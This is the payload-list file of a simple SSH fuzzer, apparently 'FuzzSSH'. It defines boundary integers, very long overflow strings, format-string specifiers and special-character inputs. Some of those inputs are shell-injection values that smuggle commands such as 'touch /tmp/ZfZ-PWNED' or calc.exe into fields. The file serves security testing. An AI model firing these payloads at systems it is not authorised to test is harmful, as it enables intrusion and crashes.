#!/usr/bin/env python3 
# -*- coding: utf-8 -*-"
"""
FuzzSSH (Simple SSH Fuzzer) - 2022 - by psy (epsylon@riseup.net)

You should have received a copy of the GNU General Public License along
with FuzzSSH; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""
numbers = ("0", "-0", "1", "-1", "32767", "-32768", "2147483647", "-2147483647", "2147483648", "-2147483648",
            "4294967294", "4294967295", "4294967296", "357913942", "-357913942", "536870912", "-536870912",
            "1.79769313486231E+308", "3.39519326559384E-313", "99999999999", "-99999999999", "0x100", "0x1000",
            "0x3fffffff", "0x7ffffffe", "0x7fffffff", "0x80000000", "0xffff", "0xfffffffe", "0xfffffff", "0xffffffff",
            "0x10000", "0x100000", "0x99999999", "65535", "65536", "65537", "16777215", "16777216", "16777217", "-268435455")

overflows = ('A' * 600, 'A' * 1200, 'A' * 2200, 'A' * 4200, 'A' * 8200, 'A' * 11000,
             'A' * 22000, 'A' * 52000, 'A' * 110000, 'A' * 550000, 'A' * 1100000,
             'A' * 2200000, 'A' * 5500000, 'A' * 12000000, "\0x99" * 1200)

strings = ("%n%n%n%n%n", "%p%p%p%p%p", "%s%s%s%s%s", "%d%d%d%d%d", "%x%x%x%x%x",
              "%s%p%x%d", "%.1024d", "%.1025d", "%.2048d", "%.2049d", "%.4096d", "%.4097d",
              "%99999999999s", "%08x", "%%20n", "%%20p", "%%20s", "%%20d", "%%20x",
              "%#0123456x%08x%x%s%p%d%n%o%u%c%h%l%q%j%z%Z%t%i%e%g%f%a%C%S%08x%%",
              "%n%n%n%n%n%n%n%n%n%n%p%p%p%p%p%p%p%p%p%p%x%x%x%x%x%x%x%x%x%x%d%d%d%d%d%d%d%d%d%d%s%s%s%s%s%s%s%s%s%s",
              "\0xCD\0xCD\0xCD\0xCD\0xCD\0xCD\0xCD\0xCD\0xCD\0xCD\0xCD\0xCD\0xCD\0xCD\0xCD\0xCD\0xCD\0xCD\0xCD\0xCD\0xCD\0xCD\0xCD\0xCD\0xCD\0xCD\0xCD\0xCD\0xCD\0xCD\0xCD\0xCD\0xCD\0xCD\0xCD\0xCD\0xCD\0xCD\0xCD\0xCD\0xCD\0xCD\0xCD\0xCD\0xCD\0xCD\0xCD\0xCD\0xCD\0xCD",
              "\0xCB\0xCB\0xCB\0xCB\0xCB\0xCB\0xCB\0xCB\0xCB\0xCB\0xCB\0xCB\0xCB\0xCB\0xCB\0xCB\0xCB\0xCB\0xCB\0xCB\0xCB\0xCB\0xCB\0xCB\0xCB\0xCB\0xCB\0xCB\0xCB\0xCB\0xCB\0xCB\0xCB\0xCB\0xCB\0xCB\0xCB\0xCB\0xCB\0xCB\0xCB\0xCB\0xCB\0xCB\0xCB\0xCB\0xCB\0xCB\0xCB\0xCB")

bugs = ("~!@#$%^&*()-=_+", "[]\{}|;:,./<>?\\", "<<<<<<<<<<>>>>>>>>>>", "\\\\\\\\\\//////////", "^^^^^^^^^^^^^^^^^^^^",
             "||||||||||~~~~~~~~~~", "?????[[[[[]]]]]{{{{{}}}}}((())", "test|touch /tmp/ZfZ-PWNED|test", "test`touch /tmp/ZfZ-PWNED`test",
             "test'touch /tmp/ZfZ-PWNED'test", "test;touch /tmp/ZfZ-PWNED;test", "test&&touch /tmp/ZfZ-PWNED&&test", "test|C:/WINDOWS/system32/calc.exe|test",
             "test`C:/WINDOWS/system32/calc.exe`test", "test'C:/WINDOWS/system32/calc.exe'test", "test;C:/WINDOWS/system32/calc.exe;test",
             "/bin/sh", "C:/WINDOWS/system32/calc.exe", "�����", "%0xa", "%u000", "/" * 200, "\\" * 200, "-----99999-----", "[[[abc123]]]", "|||/////|||")
